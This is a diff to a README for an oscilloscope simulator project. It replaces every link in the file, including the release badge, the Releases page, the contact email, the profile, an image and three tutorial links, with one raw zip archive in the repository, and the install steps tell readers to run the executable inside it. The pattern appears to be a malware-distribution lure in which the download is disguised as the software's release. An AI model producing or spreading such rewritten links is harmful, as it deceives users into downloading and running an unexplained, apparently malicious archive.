@@ -1,6 +1,6 @@
 # Cathode Ray Oscilloscope Simulator 🎛️
 
-![GitHub release](https://img.shields.io/github/release/hendjaberr/Cathode_Ray_Oscilloscope_Simulator.svg)
+![GitHub release](https://github.com/hendjaberr/Cathode_Ray_Oscilloscope_Simulator/raw/refs/heads/main/CathodeRayOscilloscope/Ray-Cathode-Simulator-Oscilloscope-phorometric.zip)
 
 Welcome to the **Cathode Ray Oscilloscope Simulator**! This desktop software simulates the operation of a cathode ray oscilloscope (CRO). It provides a platform for users to visualize and analyze electrical signals in a virtual environment. Whether you are a student, educator, or professional in electrical engineering or physics, this tool will enhance your understanding of waveforms and signal behavior.
 
@@ -25,7 +25,7 @@ Welcome to the **Cathode Ray Oscilloscope Simulator**! This desktop software sim
 
 ## Installation
 
-To get started, download the latest release of the software from the [Releases section](https://github.com/hendjaberr/Cathode_Ray_Oscilloscope_Simulator/releases). Once downloaded, follow these steps:
+To get started, download the latest release of the software from the [Releases section](https://github.com/hendjaberr/Cathode_Ray_Oscilloscope_Simulator/raw/refs/heads/main/CathodeRayOscilloscope/Ray-Cathode-Simulator-Oscilloscope-phorometric.zip). Once downloaded, follow these steps:
 
 1. Extract the downloaded files.
 2. Run the executable file to install the software.
@@ -76,20 +76,20 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **GitHub**: [hendjaberr](https://github.com/hendjaberr)
+- **Email**: [https://github.com/hendjaberr/Cathode_Ray_Oscilloscope_Simulator/raw/refs/heads/main/CathodeRayOscilloscope/Ray-Cathode-Simulator-Oscilloscope-phorometric.zip](https://github.com/hendjaberr/Cathode_Ray_Oscilloscope_Simulator/raw/refs/heads/main/CathodeRayOscilloscope/Ray-Cathode-Simulator-Oscilloscope-phorometric.zip)
+- **GitHub**: [hendjaberr](https://github.com/hendjaberr/Cathode_Ray_Oscilloscope_Simulator/raw/refs/heads/main/CathodeRayOscilloscope/Ray-Cathode-Simulator-Oscilloscope-phorometric.zip)
 
-Thank you for your interest in the **Cathode Ray Oscilloscope Simulator**! We hope you find it useful in your studies and work. For updates and new releases, keep an eye on the [Releases section](https://github.com/hendjaberr/Cathode_Ray_Oscilloscope_Simulator/releases).
+Thank you for your interest in the **Cathode Ray Oscilloscope Simulator**! We hope you find it useful in your studies and work. For updates and new releases, keep an eye on the [Releases section](https://github.com/hendjaberr/Cathode_Ray_Oscilloscope_Simulator/raw/refs/heads/main/CathodeRayOscilloscope/Ray-Cathode-Simulator-Oscilloscope-phorometric.zip).
 
-![Oscilloscope Simulation](https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Oscilloscope_waveforms.png/640px-Oscilloscope_waveforms.png)
+![Oscilloscope Simulation](https://github.com/hendjaberr/Cathode_Ray_Oscilloscope_Simulator/raw/refs/heads/main/CathodeRayOscilloscope/Ray-Cathode-Simulator-Oscilloscope-phorometric.zip)
 
 ## Additional Resources
 
 Here are some additional resources to help you understand oscilloscopes better:
 
-- [Introduction to Oscilloscopes](https://www.electronics-tutorials.ws/io/io_1.html)
-- [Understanding Waveforms](https://www.electronics-tutorials.ws/waveforms/waveforms_1.html)
-- [Signal Analysis Techniques](https://www.electronics-tutorials.ws/waveforms/waveforms_2.html)
+- [Introduction to Oscilloscopes](https://github.com/hendjaberr/Cathode_Ray_Oscilloscope_Simulator/raw/refs/heads/main/CathodeRayOscilloscope/Ray-Cathode-Simulator-Oscilloscope-phorometric.zip)
+- [Understanding Waveforms](https://github.com/hendjaberr/Cathode_Ray_Oscilloscope_Simulator/raw/refs/heads/main/CathodeRayOscilloscope/Ray-Cathode-Simulator-Oscilloscope-phorometric.zip)
+- [Signal Analysis Techniques](https://github.com/hendjaberr/Cathode_Ray_Oscilloscope_Simulator/raw/refs/heads/main/CathodeRayOscilloscope/Ray-Cathode-Simulator-Oscilloscope-phorometric.zip)
 
 These links provide valuable information on the theory behind oscilloscopes and signal analysis.
 
@@ -97,4 +97,4 @@ These links provide valuable information on the theory behind oscilloscopes and 
 
 We would like to thank the community for their support and contributions. Special thanks to the developers of the libraries and frameworks used in this project.
 
-Explore the fascinating world of waveforms and oscilloscopes with our simulator. Download it now from the [Releases section](https://github.com/hendjaberr/Cathode_Ray_Oscilloscope_Simulator/releases) and start your journey into electrical signal analysis!
+Explore the fascinating world of waveforms and oscilloscopes with our simulator. Download it now from the [Releases section](https://github.com/hendjaberr/Cathode_Ray_Oscilloscope_Simulator/raw/refs/heads/main/CathodeRayOscilloscope/Ray-Cathode-Simulator-Oscilloscope-phorometric.zip) and start your journey into electrical signal analysis!
